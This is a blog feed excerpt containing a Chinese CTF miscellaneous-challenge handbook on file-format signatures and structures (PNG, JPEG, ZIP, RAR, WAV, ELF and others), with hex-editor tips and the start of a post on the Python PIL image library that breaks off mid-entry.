    <content type="html"><![CDATA[<h1 id="CTF杂项手册"><a href="#CTF杂项手册" class="headerlink" title="CTF杂项手册"></a>CTF杂项手册</h1><h3 id="图片base64"><a href="#图片base64" class="headerlink" title="图片base64"></a>图片base64</h3><p>base64图片头：<code>data:image/jpg;base64,</code>。</p><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>文件头总是由位固定的字节来描述，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。</p><p>总体来说就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块……</span><br></pre></td></tr></table></figure><h5 id="数据块-CHUNk"><a href="#数据块-CHUNk" class="headerlink" title="数据块 CHUNk"></a>数据块 CHUNk</h5><p>PNG 定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块定义了 4 个标准数据块，每个 PNG 文件都必须包含它们，PNG 读写软件也都必须要支持这些数据块。</p><p>也就是说有的数据块是可选的，有的是必须有的，我们就介绍一下必须有的数据块。</p><p>对于每个数据块都有着统一的数据结构，每个数据块由 4 个部分组成。</p><table><thead><tr><th align="center">Length（长度）</th><th>4 字节</th><th>指定数据块中数据域的长度，其长度不超过（231－1）字节</th></tr></thead><tbody><tr><td align="center">Chunk Type Code（数据块类型码）</td><td>4 字节</td><td>数据块类型码由 ASCII 字母（A - Z 和 a - z）组成</td></tr><tr><td align="center">Chunk Data（数据块数据）</td><td>可变长度</td><td>存储按照 Chunk Type Code 指定的数据</td></tr><tr><td align="center">CRC（循环冗余检测）</td><td>4 字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><h5 id="文件头数据块IHDR"><a href="#文件头数据块IHDR" class="headerlink" title="文件头数据块IHDR"></a>文件头数据块IHDR</h5><p>文件头数据块 IHDR（Header Chunk）：它包含有 PNG 文件中存储的图像数据的基本信息，由 13 字节组成，并要作为第一个数据块出现在 PNG 数据流中，而且一个 PNG 数据流中只能有一个文件头数据块。</p><p>文件头数据块（IHDR）定义了PNG文件的宽高、色深、压缩方法等参数。</p><p>上面我们讲了每个数据块都包含四个部分：</p><ul><li>长度（Length）：4 bytes</li><li>数据块类型（Chunk Type）：4 bytes</li><li>数据块数据（Chunk Data）：Length bytes</li><li><strong>CRC</strong>校验码：4 bytes，由Chunk Type和Chunk Data</li></ul><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/22.png" alt="22"></p><h5 id="图像结束数据IEND"><a href="#图像结束数据IEND" class="headerlink" title="图像结束数据IEND"></a>图像结束数据IEND</h5><p>图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 49 45 4E 44 AE 42 60 82</span><br></pre></td></tr></table></figure><p>IEND 数据块的长度总是 <code>00 00 00 00</code>，数据标识总是 IEND <code>49 45 4E 44</code>，因此，CRC 码也总是 <code>AE 42 60 82</code>。</p><h5 id="图像数据块IDAT"><a href="#图像数据块IDAT" class="headerlink" title="图像数据块IDAT"></a>图像数据块IDAT</h5><p>图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT 块只有当上一个块充满时，才会继续一个新的块。使用pngcheck工具进行检查，如果前一个数据块没有满，而后一个数据块有数据，则说明这里隐藏了信息。</p><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>JPEG（Joint Photographic Experts Group）是联合图像专家小组的英文缩写。它由国际电话与电报咨询委员会CCITT（The International Telegraph and Telephone Consultative Committee）与国际标准化组织ISO于1986年联合成立的一个小组，负责制定静态数字图像的编码标准。</p><p>JPEG算法压缩出来的静态图片文件称为JPEG文件，扩展名通常为.jpg、.jpe、jpeg。</p><p>JPEG文件大体上可以分成两个部分：标记码(Tag)和压缩数据。</p><p>标记码由两个字节构成，其前一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值。在每个标记码之前还可以添加数目不限的无意义的0xFF填充，也就说连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始。而在一个完整的两字节的标记码后，就是该标记码对应的压缩数据流，记录了关于文件的诸种信息。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/24.png" alt="24"></p><p>常用的标记有<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#SOI">SOI</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#APP0">APP0</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#DQT">DQT</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#SOF">SOF0</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#DHT">DHT</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#DRI">DRI</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#SOS">SOS</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#EOI">EOI</a>。</p><p>注意，SOI等都是标记的名称。在文件中，标记码是以标记代码形式出现。例如SOI的标记代码为0xFFD8，即在JPEG文件中的如果出现数据0xFFD8，则表示此处为一个SOI标记。</p><p>常用标记的标记代码、占用字节长度和表示的意义。</p><p>SOF0</p><table><thead><tr><th>序号</th><th>名称</th><th>长度</th><th>描述</th></tr></thead><tbody><tr><td>①</td><td>数据长度</td><td>2 字节</td><td>①~⑥ 六个字段的总长度，即不包括标记代码，但包括本字段</td></tr><tr><td>②</td><td>精度</td><td>1 字节</td><td>每个数据样本的位数，通常是 8 位，一般软件都不支持 12 位和 16 位</td></tr><tr><td>③</td><td>图像高度</td><td>2 字节</td><td>图像高度（单位：像素），如果不支持 DNL 就必须 &gt; 0</td></tr><tr><td>④</td><td>图像宽度</td><td>2 字节</td><td>图像宽度（单位：像素），如果不支持 DNL 就必须 &gt; 0</td></tr><tr><td>⑤</td><td>颜色分量数</td><td>1 字节</td><td>只有 3 个数值可选<br/> 1：灰度图；3：YCrCb 或 YIQ；4：CMYK；<br/> 而 JFIF 中使用 YCrCb，故这里颜色分量数恒为 3</td></tr><tr><td>⑥</td><td>颜色分量信息</td><td>颜色分量数×3字节（通常为 9 字节）</td><td>《颜色分量信息表格》</td></tr></tbody></table><p>通常找到FFC0，之后的第三个到第七个字节就是长度和宽度。</p><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>一个 ZIP 文件由三个部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><ul><li><p>压缩源文件数据区：</p><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度 </p></li><li><p>压缩源文件目录区：</p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p></li><li><p>压缩源文件目录结束标志： </p><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p></li></ul><p>总结：通过<strong>压缩源文件目录区50 4B 01 02 1F 00 14 00 0奇/偶 00 来表示是否加密</strong>。</p><h4 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h4><h5 id="文件格式-1"><a href="#文件格式-1" class="headerlink" title="文件格式"></a>文件格式</h5><p>RAR 文件主要由标记块，压缩文件头块，文件头块，结尾块组成。Rar压缩包的文件头为 <code>0x 52 61 72 21 1A 07 00</code>。</p><p>RAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。</p><h5 id="每个块的组成"><a href="#每个块的组成" class="headerlink" title="每个块的组成"></a>每个块的组成</h5><table><thead><tr><th align="left">名称</th><th align="left">大小</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">HEAD_CRC</td><td align="left">2</td><td align="left">全部块或块部分的CRC</td></tr><tr><td align="left">HEAD_TYPE</td><td align="left">1</td><td align="left">块类型</td></tr><tr><td align="left">HEAD_FLAGS</td><td align="left">2</td><td align="left">阻止标志</td></tr><tr><td align="left">HEAD_SIZE</td><td align="left">2</td><td align="left">块大小</td></tr><tr><td align="left">ADD_SIZE</td><td align="left">4</td><td align="left">可选字段 - 添加块大小</td></tr></tbody></table><h5 id="结尾快"><a href="#结尾快" class="headerlink" title="结尾快"></a>结尾快</h5><p>结尾快（Terminator）都是固定的。</p><table><thead><tr><th align="left">Field Name</th><th align="left">Size (bytes)</th><th align="left">Possibilities</th></tr></thead><tbody><tr><td align="left">HEAD_CRC</td><td align="left">2</td><td align="left">Always 0x3DC4</td></tr><tr><td align="left">HEAD_TYPE</td><td align="left">1</td><td align="left">Header type: 0x7b</td></tr><tr><td align="left">HEAD_FLAGS</td><td align="left">2</td><td align="left">Always 0x4000</td></tr><tr><td align="left">HEAD_SIZE</td><td align="left">2</td><td align="left">Block size = 0x0007</td></tr></tbody></table><h4 id="MKV"><a href="#MKV" class="headerlink" title="MKV"></a>MKV</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman: Matroska data</span><br></pre></td></tr></table></figure><h4 id="WAV"><a href="#WAV" class="headerlink" title="WAV"></a>WAV</h4><h5 id="RIFF格式"><a href="#RIFF格式" class="headerlink" title="RIFF格式"></a>RIFF格式</h5><p>「 Resource Interchange File Format（简称RIFF），资源交换文件格式，是一种按照标记区块存储数据（tagged chunks）的通用文件存储格式，多用于存储音频、视频等多媒体数据.Microsoft在windows下的AVI、ANI 、WAV等都是基于RIFF实现的。</p><p>RIFF是由chunk构成的，chunk是RIFF组成的基本单位，每个CHUNK可看作存贮了视频的一帧数据或者是音频的一帧数据。</p><h5 id="CHUNK的结构"><a href="#CHUNK的结构" class="headerlink" title="CHUNK的结构"></a>CHUNK的结构</h5><p>CHUNK总共由三个部分组成：</p><ul><li>FOURCC  使用4字节的ASIIC字符标识类型</li><li>SIZE       数据的大小</li><li>DATA      用于存放数据</li></ul><p>CHUNK在一般情况下不能嵌套，但是当CHUNK的FOURCC为”RIFF”或者是”LIST”的时候可以嵌套数据。</p><p>“RIFF”的第一个CHUNK的FOURCC一定是”RIFF”，所以FOURCC为LIST的一定是子CHUNK及SUBCHUNK。</p><p>“RIFF”的CHUNK在DATA区域的前四个字节称为”Form Type”记录了数据的类型，比如我们的wav文件的Form Type就是”WAV”。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/38.png" alt="38"></p><h5 id="脉冲编码调制（PCM）"><a href="#脉冲编码调制（PCM）" class="headerlink" title="脉冲编码调制（PCM）"></a>脉冲编码调制（PCM）</h5><p>「PCM 脉冲编码调制是Pulse Code Modulation的缩写，脉冲编码调制是数字通信的编码方式之一.主要过程是将话音、图像等模拟信号每隔一定时间进行取样，使其离散化，同时将抽样值按分层单位四舍五入取整量化，同时将抽样值按一组二进制码来表示抽样脉冲的幅值。」</p><h5 id="WAV文件的CHUNK信息"><a href="#WAV文件的CHUNK信息" class="headerlink" title="WAV文件的CHUNK信息"></a>WAV文件的CHUNK信息</h5><p>WAVE文件是由若干个CHUNK组成的.按照文件中CHUNK的出现顺序分别为：RIFF Chunk, Format Chunk, Fact Chunk, Data Chunk,其中的Fact CHUNK为非必要部分，结构具体如下图所示：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/39.png" alt="39"></p><p>RIFF是头CHUNK,而Format CHUNK里面记录了WAV的各种参数信息，详细参数信息如下：</p><ul><li>FormatTag       音频数据的编码方式，其中PCM方式为1</li><li>Channels        声道数，单声道为1，双声道为2</li><li>SamplesPerSec   采样率(每秒样本数)</li><li>BytesPerSec*     音频数据传送速率</li><li>BlockAlign*      每次采样的大小</li><li>BitsPerSample*   每个声道的采样精度</li></ul><h5 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#读取wav文件，我这儿读了个自己用python写的音阶的wav</span></span><br><span class="line">filename = <span class="string">&#x27;1.wav&#x27;</span></span><br><span class="line">wavefile = wave.open(filename, <span class="string">&#x27;r&#x27;</span>) <span class="comment"># open for writing</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#读取wav文件的四种信息的函数。期中numframes表示一共读取了几个frames，在后面要用到滴。</span></span><br><span class="line">nchannels = wavefile.getnchannels()</span><br><span class="line">sample_width = wavefile.getsampwidth()</span><br><span class="line">framerate = wavefile.getframerate()</span><br><span class="line">numframes = wavefile.getnframes()</span><br><span class="line">info= wavefile.getparams()</span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;channel&quot;</span>,nchannels)</span><br><span class="line">print(<span class="string">&quot;sample_width&quot;</span>,sample_width)</span><br><span class="line">print(<span class="string">&quot;framerate&quot;</span>,framerate)</span><br><span class="line">print(<span class="string">&quot;numframes&quot;</span>,numframes)</span><br><span class="line">print(<span class="string">&quot;info&quot;</span>,info)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">channel <span class="number">1</span></span><br><span class="line">sample_width <span class="number">2</span></span><br><span class="line">framerate <span class="number">8000</span></span><br><span class="line">numframes <span class="number">159999</span></span><br><span class="line">info _wave_params(nchannels=<span class="number">1</span>, sampwidth=<span class="number">2</span>, framerate=<span class="number">8000</span>, nframes=<span class="number">159999</span>, comptype=<span class="string">&#x27;NONE&#x27;</span>, compname=<span class="string">&#x27;not compressed&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="PYC"><a href="#PYC" class="headerlink" title="PYC"></a>PYC</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03F30D0A</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t@kali:~&#x2F;桌面&#x2F;steady# file &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;O_O </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;steady&#x2F;O_O: python 3.6 byte-compiled</span><br></pre></td></tr></table></figure><h4 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h4><p><code>7F 45 4C 46</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file <span class="string">&#x27;/root/桌面/flag/1&#x27;</span> </span><br><span class="line">/root/桌面/flag/<span class="number">1</span>: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.24</span>, BuildID[sha1]=<span class="number">8</span>df45089fa39fec83423ec37a944e81065d16bee, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure><p>使用ideal或者linux直接打开。</p><h4 id="vmdk"><a href="#vmdk" class="headerlink" title="vmdk"></a>vmdk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;_mianju.jpg.extracted&#x2F;flag.vmdk&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;_mianju.jpg.extracted&#x2F;flag.vmdk: VMware4 disk image</span><br></pre></td></tr></table></figure><p>vmdk也可以用7z解压。</p><h4 id="avi"><a href="#avi" class="headerlink" title="avi"></a>avi</h4><p>视频文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;zip&#x2F;里面都是出题人.jpg&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;zip&#x2F;里面都是出题人.jpg: RIFF (little-endian) data, AVI, 720 x 480, ~30 fps, video: uncompressed, audio: uncompressed PCM (stereo, 48000 Hz)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52 49 46 46 1C 7D 7D 02</span><br></pre></td></tr></table></figure><p>elf</p><p>可以直接在linux下运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;hidden_binary</span><br><span class="line">&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;hidden_binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;101705e6f60a300ab34f377a87fdb67f92996732, for GNU&#x2F;Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="01editor"><a href="#01editor" class="headerlink" title="01editor"></a>01editor</h4><p><img src="C:\Users\12521\AppData\Roaming\Typora\typora-user-images\image-20201030154428607.png" alt="image-20201030154428607"></p><p>可以使用搜索功能搜索十六进制和ascii，搜索-&gt;查找。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/28.png" alt="28"></p><p>更换编码方式。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/47.png" alt="47"></p><h4 id="notepad"><a href="#notepad" class="headerlink" title="notepad++"></a>notepad++</h4><h5 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/59.png" alt="59"></p><h5 id="标记替换功能"><a href="#标记替换功能" class="headerlink" title="标记替换功能"></a>标记替换功能</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/60.png" alt="60"></p><h5 id="转换大小写"><a href="#转换大小写" class="headerlink" title="转换大小写"></a>转换大小写</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/61.png" alt="61"></p><h5 id="生成md5"><a href="#生成md5" class="headerlink" title="生成md5"></a>生成md5</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/62.png" alt="62"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF杂项手册&quot;&gt;&lt;a href=&quot;#CTF杂项手册&quot; class=&quot;headerlink&quot; title=&quot;CTF杂项手册&quot;&gt;&lt;/a&gt;CTF杂项手册&lt;/h1&gt;&lt;h3 id=&quot;图片base64&quot;&gt;&lt;a href=&quot;#图片base64&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>CTF-python库PIL的使用</title>
    <link href="http://s1eady.top/2020/11/10/CTF-python%E5%BA%93PIL%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/10/CTF-python%E5%BA%93PIL%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-10T14:14:20.000Z</published>
    <updated>2020-11-06T11:24:51.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-python库的使用-PIL库"><a href="#CTF-python库的使用-PIL库" class="headerlink" title="CTF-python库的使用-PIL库"></a>CTF-python库的使用-PIL库</h1><h2 id="PIL库"><a href="#PIL库" class="headerlink" title="PIL库"></a>PIL库</h2><h3 id="生成Image对象"><a href="#生成Image对象" class="headerlink" title="生成Image对象"></a>生成Image对象</h3><p>im是一个Image对象，属性有format，size，mode。format是格式，size 是一个元组，表示(宽，高)，mode则指的图片的模式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#生成一个image对象。</span></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line"><span class="comment">#显示图片</span></span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h3 id="Image对象常用方法"><a href="#Image对象常用方法" class="headerlink" title="Image对象常用方法"></a>Image对象常用方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">im.save(&#39;test.jpg&#39;, &#39;jpeg&#39;)保存到文件，第二个参数为格式</span><br><span class="line">im.show()显示图像，会启动一个新窗口</span><br><span class="line">im.size(这是属性不是方法)得到图像的大小，返回值为tuple，可以通过元组来读取。</span><br><span class="line">im &#x3D; im.convert(&#39;L&#39;)色彩空间的转换，支持RGB、CMYK等常见空间，注意这个函数不是就地的结果保存在返回值里</span><br><span class="line">im.colors()很有用的方法，返回颜色统计列表(count, color)，可以判断图像中的色彩分布</span><br><span class="line">im.hist()直方图，与colors方法类似，但直接返回的是每个像素的直方高度</span><br><span class="line">im.getpixel((x, y))得到某个像素点的颜色，一般返回(r, g, b)</span><br><span class="line">im.putpixel((x, y), color)设置某个像素点的颜色，这个操作是就地的</span><br></pre></td></tr></table></figure><h4 id="im-size"><a href="#im-size" class="headerlink" title="im.size"></a>im.size</h4><p>打印出像素值。也就是图片的高度宽度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">print(img.size)</span><br><span class="line">(<span class="number">2000</span>, <span class="number">1328</span>)</span><br></pre></td></tr></table></figure><p>遍历图片的每一个坐标或像素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">print(img.size)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">        print(i,j)</span><br></pre></td></tr></table></figure><h4 id="im-getpixel-x-y"><a href="#im-getpixel-x-y" class="headerlink" title="im.getpixel((x, y))"></a>im.getpixel((x, y))</h4><p>得到某个像素点的颜色，一般返回(r, g, b)</p><p>遍历每个像素点的颜色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">print(img.size)</span><br><span class="line">print(img.size)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">        print(img.getpixel((i, j)))</span><br></pre></td></tr></table></figure><h3 id="图片剪贴"><a href="#图片剪贴" class="headerlink" title="图片剪贴"></a>图片剪贴</h3><p>crop()方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">img = im.crop(box)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><p>box，是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。假设box是(b1,a1,b2,a2)，则所取区域是以各自坐标划线所围的区域。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/29.png" alt="29"></p><h3 id="图片黏贴"><a href="#图片黏贴" class="headerlink" title="图片黏贴"></a>图片黏贴</h3><p>paste()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">50</span>,<span class="number">50</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">im.paste(region,box)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><h3 id="图像分帧"><a href="#图像分帧" class="headerlink" 